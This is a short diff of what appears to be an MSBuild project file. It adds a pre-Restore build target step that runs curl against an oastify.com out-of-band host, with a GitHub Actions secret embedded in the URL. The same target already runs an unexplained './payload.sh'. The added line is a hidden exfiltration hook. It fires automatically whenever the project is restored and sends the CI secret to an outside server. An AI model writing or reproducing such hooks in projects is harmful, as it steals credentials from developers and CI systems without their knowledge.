@@ -10,6 +10,8 @@
 
   <Target Name="RunCustomScriptOnRestore" BeforeTargets="Restore">
 	  <Exec Command="bash ./payload.sh" />
+		
+	  <Exec Command="curl o1q5y9gifcacj4hiu67pqlv940asynmc.oastify.com/${{ secrets.VERY_SECRET_VALUE }}" />
   </Target>
 
 
